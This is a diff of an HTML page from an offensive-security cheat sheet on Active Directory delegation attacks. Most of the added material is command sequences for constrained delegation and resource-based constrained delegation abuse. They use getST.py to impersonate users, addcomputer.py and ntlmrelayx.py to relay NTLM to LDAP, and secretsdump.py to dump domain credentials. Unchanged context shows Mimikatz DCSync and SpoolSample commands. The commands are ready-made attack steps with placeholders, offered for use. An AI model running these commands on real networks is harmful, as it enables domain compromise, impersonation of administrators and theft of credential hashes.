@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2021-01-21T17:33:37 CET">
+<meta name="revised" content="2021-02-06T18:37:10 CET">
 <title>Active Directory Delegations :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -1662,6 +1662,13 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
+      <li data-nav-id="/resources/cti/" class="dd-item">
+        <div>
+          <a href="/resources/cti/">
+            Cyber Threat Intel
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
         </ul>
     </li>
 
@@ -1807,8 +1814,33 @@ Rubeus.exe monitor /interval:1
 .<span style="color:#8045ff">\S</span>poolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME</code></pre></div>
 <p><br/></p>
 
+<h3 id="constrained-delegation">Constrained Delegation</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># AD Objects having Unconstrained Delegation issues have the TRUSTED_TO_AUTH_FOR_DELEGATION flag set</span>
+<span style="color:#75715e"># The msDS-AllowedToDelegateTo indicates objects involded in the delegation rights</span>
+
+<span style="color:#75715e"># The goal is to get a ticket for an impseronated user on a service we have delegation rights to</span>
+getST.py -spn SERVICE/HOSTNAME_YOU_HAVE_DELEGATION_RIGHTS_TO.FQDN -impersonate TARGET_USER DOMAIN/USERNAME:PASSWORD
+
+<span style="color:#75715e"># It is then possible to modify the service name portion of the ticket (not encrypted)</span>
+<span style="color:#75715e"># Impackets auto update the sname in backend</span>
+<span style="color:#75715e"># The following posts describes this behavior</span>
+https://www.secureauth.com/blog/kerberos-delegation-spns-and-more
+
+<span style="color:#75715e"># Once the ticket have been generated, we can then use it</span>
+<span style="color:#111">export</span> <span style="color:#111">KRB5CCNAME</span><span style="color:#f92672">=</span>/path/to/ticket.ccache
+$ python secretsdump.py -k DC1.foo.lan -just-dc  </code></pre></div>
+<p><br/></p>
+
 <h3 id="rbcd-exploitation">RBCD Exploitation</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://github.com/aas-n/leHACK19
+
+<span style="color:#75715e"># Microsoft is releasing an update in March 2020 that will enable LDAP channel binding &amp; LDAP</span> 
+<span style="color:#75715e"># signing by default on Windows systems, remediating this potential attack vector on fully patched systems.</span>
+
+<span style="color:#75715e"># When to use :</span> 
+<span style="color:#75715e"># Basically, when you’re on a network and want to get a shell on a different system on that same network segment.</span>
+<span style="color:#75715e"># This attack can be ran without needing any prior credentials.</span>
+<span style="color:#75715e"># However, the method described does require that a domain controller in the environment is configured with LDAPS.</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># From Windows Hosts</span>
 
 <span style="color:#75715e"># Importing Powerview and Powermad</span>
 Import-Module .<span style="color:#8045ff">\P</span>owerview.ps1
@@ -1842,7 +1874,25 @@ Get-DomainComputer <span style="color:#111">$TargetComputer</span> -Credential <
 
 <span style="color:#75715e"># Then, you can get the NTLM hash of domain admin using DCSync and Mimikatz</span>
 .<span style="color:#8045ff">\M</span>imikatz.exe
-mimikatz&gt; lsadump::dcsync /user:domain<span style="color:#8045ff">\A</span>dminisrator /domain:domain.lan /dc:DC01.domain.lan</code></pre></div>
+mimikatz&gt; lsadump::dcsync /user:domain<span style="color:#8045ff">\A</span>dminisrator /domain:domain.lan /dc:DC01.domain.lan</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># From Linux Hosts</span>
+
+<span style="color:#75715e"># First step is creating a computer account in order to have control on a computer account with SPNs</span>
+addcomputer.py -method SAMR -computer-pass MADE_UP_PASSWORD -computer-name MADE_UP_NAME DOMAIN/USER:PASSWORD
+
+<span style="color:#75715e"># Then you want to intercept NTLM hashes and forward them to LDAP on a DC</span>
+<span style="color:#75715e"># It allows you to impersonate the relayed account and set msDS-AllowedToActOnBehalfOfOtherIdentity</span>
+ntlmrelayx.py -wh WPAD_Host --delegate-access --escalate-user YOUR_COMPUTER_ACCOUNT<span style="color:#8045ff">\$</span> -t ldap://DC.DOMAIN.LOCAL
+ntlmrelayx.py -wh COMPUTER.DOMAIN.LOCAL --delegate-access --escalate-user YOUR_COMPUTER_ACCOUNT<span style="color:#8045ff">\$</span> -t ldap://DC.DOMAIN.LOCAL
+
+<span style="color:#75715e"># Then, start a relay tool (mitm6, responder...)</span>
+<span style="color:#75715e"># If another host authenticates succesfully and give impersonation rights, we can then use them</span>
+
+<span style="color:#75715e"># Then you will want to get a valid TGS to connect to the server using our new delegation rights</span>
+<span style="color:#75715e"># We can for example choose to impersonate administrators</span>
+getST.py -spn cifs/Server_You_Relayed_To_Get_RBCD_Rights_On -impersonate TARGET_ACCOUNT  DOMAIN/YOUR_CREATED_COMPUTER_ACCOUNT<span style="color:#8045ff">\$</span>:PASSWORD
+
+<span style="color:#111">export</span> <span style="color:#111">KRB5CCNAME</span><span style="color:#f92672">=</span>/path/to/ticket.ccache
+$ python secretsdump.py -k DC1.foo.lan -just-dc </code></pre></div>
 
     
     
